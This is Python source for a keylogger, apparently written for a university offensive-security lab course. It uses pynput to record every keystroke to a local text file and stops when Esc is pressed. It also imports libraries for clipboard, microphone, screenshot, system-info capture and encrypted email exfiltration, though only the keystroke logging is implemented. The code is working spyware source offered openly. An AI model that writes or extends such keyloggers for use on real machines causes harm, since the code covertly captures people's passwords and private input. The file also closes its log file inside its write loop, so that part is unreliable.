# libraries to be imported
# libraries to transfer data by email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

# libraries for collecting computer data
import socket
import platform

# libraries for clipboard date
import win32clipboard

# libraries for keystrokes
from pynput.keyboard import Key, Listener

# libraries for system info to get time
import time
import os

# libraries for microphone data
from scipy.io.wavfile import write
import sounddevice as sd

# libraries to encrypt the email containing data
from cryptography.fernet import Fernet

# libraries for passwords, usernames
import getpass
from requests import get

# libraries for screenshot data
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# file where all data is stored is created
keys_information = "key_log.txt"
file_path = "C:\\Users\\20200693\\Desktop\\Year 2\\quarter 4\\2ic80- Lab on offensive computer security\\keylogger\\keylogger\\Project"
# in order to access file with extension
extend ="\\"

count = 0
keys = []

# function to log the strokes
def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1
    # to continue to add keys
    if count >= 1:
        count = 0
        write_data(keys)
        keys = []
# function to write data collected in a file

def write_data(keys):
    # append the data in the file with the new data
    with open(file_path + extend + keys_information, "a") as file:
        for key in keys:
        # to make more readable since list change single quotes to nothing
            k = str(key).replace("'", "")
        # to put each word on a new line when space is clicked
            if k.find("space") > 0:
                file.write('\n')
                file.close()
            elif k.find("Key") == -1:
                file.write(k)
                file.close()

# function to exit from keylogger (here if esc is pressed exit is triggered)
def on_release(key):
    if key == Key.esc:
        return False
# listener block which listens the key and implements three functions
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
